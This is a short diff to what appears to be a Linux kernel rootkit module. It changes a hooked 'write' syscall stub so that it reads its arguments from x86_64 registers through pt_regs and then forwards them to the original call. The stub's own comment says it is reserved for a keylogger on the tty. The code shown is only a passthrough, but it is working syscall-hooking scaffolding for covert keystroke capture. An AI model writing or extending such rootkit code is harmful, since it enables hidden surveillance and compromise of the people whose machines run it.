@@ -255,8 +255,12 @@ static void __exit vault_kernel_exit(void) {
 /* ================================================================
  * Stub: hooked_write — passthrough (reserved for keylogger via tty)
  * ================================================================ */
-asmlinkage long hooked_write(unsigned int fd, const char __user *buf,
-                              size_t count) {
+asmlinkage long hooked_write(const struct pt_regs *regs) {
+    /* x86_64 syscall ABI: fd=di, buf=si, count=dx */
+    unsigned int fd = (unsigned int)regs->di;
+    const char __user *buf = (const char __user *)regs->si;
+    size_t count = (size_t)regs->dx;
+
     long (*orig_write)(unsigned int, const char __user *, size_t);
     orig_write = (void *)hooks[HOOKIDX_WRITE].original;
     return orig_write(fd, buf, count);
